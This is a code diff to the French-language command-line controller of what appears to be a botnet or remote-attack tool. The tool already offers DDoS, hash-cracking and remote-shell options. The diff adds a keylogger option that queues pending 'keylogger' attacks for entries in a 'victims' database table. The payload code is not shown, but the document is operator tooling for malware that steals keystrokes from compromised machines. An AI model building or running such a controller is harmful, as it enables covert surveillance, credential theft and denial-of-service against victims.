@@ -47,6 +47,9 @@ action_group.add_argument("--ddos", action="store_true", help="lance une attaque
 # Arguments spécifiques à l'attaque de crack
 action_group.add_argument("--crack", action="store_true", help="lance une attaque de crack sur un ordinateur")
 
+# Arguments spécifiques à l'attaque de keylogger
+action_group.add_argument("--keylogger", action="store_true", help="lance un keylogger sur un ordinateur")
+
 # Lance un shell sur une machine précise
 action_group.add_argument("--shell", action="store_true", help="Lance un shell sur une machine précise")
 
@@ -67,7 +70,7 @@ action_group.add_argument("--no-multi-task", action="store_true",  help="Désact
 # Arguments pour les différentes attaques
 parser.add_argument("--port", type=int, help="démarre le serveur sur le port suivant")
 parser.add_argument("--address", type=str, help="adresse ip de l'ordinateur à attaquer")
-parser.add_argument("--time", type=int, help="temps de l'attaque ddos en seconde")
+parser.add_argument("--time", type=int, help="temps de l'attaque (ddos/keylogger) en seconde")
 parser.add_argument("--hash", type=str, help="hash à cracker")
 parser.add_argument("--wordlist", type=str, help="wordlist")
 
@@ -147,9 +150,34 @@ elif args.crack:
     if not args.hash or not args.wordlist:
         parser.error("--crack nécessite les arguments --hash et --wordlist")
     elif not args.host and not args.group:
-        parser.error("--scan nécessite l'argument --host et/ou --group")
+        parser.error("--crack nécessite l'argument --host et/ou --group")
 
     print("crack du hash '" + args.hash + "' avec la wordlist " + args.wordlist)
+
+
+############################################################
+
+
+elif args.keylogger:
+    if not args.time :
+        parser.error("--keylogger nécessite l'argument --time")
+    elif not args.host:
+        parser.error("--keylogger nécessite l'argument --host")
+
+    print("keylogger lancé pour une durée de " + str(args.time) + " secondes sur " + args.host)
+
+    for victim in args.host.split(","):
+        query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+        values = (victim, victim, victim, )
+        mycursor.execute(query, values)
+
+        result = mycursor.fetchall()
+
+        for id in result:
+            query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+            values = (id[0], "keylogger", "pending", "{\"time\": \"" + str(args.time) + "\"}")
+
+            mycursor.execute(query, values)
 
 
 ############################################################
